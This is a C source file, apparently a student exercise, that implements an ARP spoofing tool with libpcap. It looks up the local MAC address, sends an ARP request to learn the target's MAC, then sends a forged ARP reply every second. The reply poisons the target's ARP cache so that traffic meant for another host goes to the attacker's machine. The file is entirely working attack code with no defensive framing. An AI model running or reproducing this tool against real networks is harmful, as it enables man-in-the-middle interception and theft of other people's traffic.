#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include "send_arp.h"
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "send_arp.h"

typedef struct Ethernet //14byte
{
    u_int8_t DestinationMACAddress[6];
    u_int8_t SourceMACAddress[6];
    u_int16_t Ethernet_Type; //next protocol
}Ethernet;

typedef struct ARPPacket{
    u_int16_t hwType = HW_TYPE;
    u_int16_t protocolType = PROTOCOL_TYPE;
    u_int8_t hwSize = HW_SIZE;
    u_int8_t protocolSize = PROTOCOL_SIZE;
    u_int16_t opcode;
    u_int8_t senderMAC[6];
    u_int8_t senderIP[4];
    u_int8_t targetMAC[6];
    u_int8_t targetIP[4];
}ARPPacket;

void usage() {
  printf("syntax: arp_spoofing <interface> <senderIP> <targetIP>\n");
  printf("sample: pcap_test ens33 192.168.3 192.168.4\n");
}


int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  unsigned char packet[100];
  Ethernet P_Ethernet;
  ARPPacket P_ARPPACKET;
  struct in_addr iaddr;

  if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
  }

   //Get My  MAC and IP

   struct ifreq s;
   int f = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
   strcpy(s.ifr_name, dev);
   if(0!= ioctl(f, SIOCGIFHWADDR, &s)){
       printf("ERROR: Cannot get local MAC addr\n");
       return -1;
   }
   uint8_t myMAC[6];
   memcpy(P_ARPPACKET.senderMAC, s.ifr_addr.sa_data, HW_SIZE);
   memcpy(myMAC,P_ARPPACKET.senderMAC,HW_SIZE);
   //printf("%x\n",P_ARPPACKET.senderMAC);

   uint8_t tmpArgv3IP[4];
   inet_pton(AF_INET, argv[3], &iaddr.s_addr);
   memcpy(P_ARPPACKET.senderIP, &iaddr.s_addr, PROTOCOL_SIZE);
   memcpy(tmpArgv3IP,P_ARPPACKET.senderIP, PROTOCOL_SIZE);

   //printf("%d\n",P_ARPPACKET.senderIP);
   close(f);

   //ARP Request (Get target MAC)
   memset(packet, NONE, sizeof(packet));
   memset(P_Ethernet.DestinationMACAddress, BROADCAST, HW_SIZE);
   //printf("%x",P_Ethernet.DestinationMACAddress);

   memcpy(P_Ethernet.SourceMACAddress, myMAC, HW_SIZE);
   //printf("%x",P_Ethernet.SourceMACAddress);

   P_Ethernet.Ethernet_Type = htons(ARP);
  // printf("%x",P_Ethernet.Ethernet_Type);

   memcpy(packet, &P_Ethernet, sizeof(P_Ethernet));
   //printf("\n\n%x",packet);

   P_ARPPACKET.hwType = htons(HW_TYPE);
   //printf("%x",P_ARPPACKET.hwType);

   P_ARPPACKET.protocolType = htons(PROTOCOL_TYPE);
   //printf("%x",P_ARPPACKET.protocolType);

   P_ARPPACKET.hwSize = HW_SIZE;
   //printf("%d",P_ARPPACKET.hwSize);

   P_ARPPACKET.protocolSize = PROTOCOL_SIZE;
   //printf("%x",P_ARPPACKET.protocolSize);

   P_ARPPACKET.opcode = htons(OPCODE_REQ);
   //printf("%x",P_ARPPACKET.opcode);

   memset(P_ARPPACKET.targetMAC, NONE, HW_SIZE);
   //printf("%d",P_ARPPACKET.targetMAC);

   uint8_t tmpArgv2IP[4];
   inet_pton(AF_INET, argv[2], &iaddr.s_addr);
   memcpy(P_ARPPACKET.targetIP, &iaddr.s_addr, PROTOCOL_SIZE);
   memcpy(tmpArgv2IP, P_ARPPACKET.targetIP, PROTOCOL_SIZE);
   //printf("%x",P_ARPPACKET.targetIP);

   memcpy(packet+sizeof(P_Ethernet), &P_ARPPACKET, sizeof(P_ARPPACKET));

   pcap_sendpacket(handle, packet, sizeof(P_Ethernet) + sizeof(P_ARPPACKET));

    uint8_t MAC2[6];
   //gathering ARP Reply (Get target MAC)
   while(1){
       struct pcap_pkthdr *header;
       const u_char* packet;
       int res = pcap_next_ex(handle, &header, &packet);
       if(res==0) continue;
       if(res==-1 || res==-2){
           printf("ERROR:pcap recieve error\n");
           return -1;
       }

       if(packet[12]==8 && packet[13]==6 && packet[21]==2){
           if(0==strncmp((char *)packet+28, (char *)P_ARPPACKET.targetIP, PROTOCOL_SIZE)){
               memcpy(P_ARPPACKET.senderMAC, packet+22,HW_SIZE);
               memcpy(MAC2, P_ARPPACKET.senderMAC,HW_SIZE);
               break;
           }
       }
   }
  //ARP Spoofing start
       memset(packet, 0, 100);
       memcpy(P_Ethernet.DestinationMACAddress,MAC2,HW_SIZE);//gateway mac addr
       memcpy(P_Ethernet.SourceMACAddress,myMAC,HW_SIZE); //my mac addr
       P_ARPPACKET.opcode=htons(OPCODE_REP); //Reply
       memcpy(P_ARPPACKET.senderIP, tmpArgv3IP, PROTOCOL_SIZE); //Set sender_ip to 117.2
       memcpy(P_ARPPACKET.targetIP, tmpArgv2IP, PROTOCOL_SIZE); //set target ip to gateway
       memcpy(P_ARPPACKET.targetMAC,MAC2,HW_SIZE);//targetmac == gateway mac
       memcpy(P_ARPPACKET.senderMAC,myMAC,HW_SIZE); //senderMAC == myMAC
       memcpy(packet, &P_Ethernet, sizeof(P_Ethernet));
       memcpy(packet+sizeof(P_Ethernet), &P_ARPPACKET, sizeof(P_ARPPACKET));

       printf("ARP Spoofind in progress. Press CTRL+C to cancel.\n");
       while(1){
           pcap_sendpacket(handle, packet, sizeof(P_Ethernet)+sizeof(P_ARPPACKET));
           sleep(1);
       }

   }
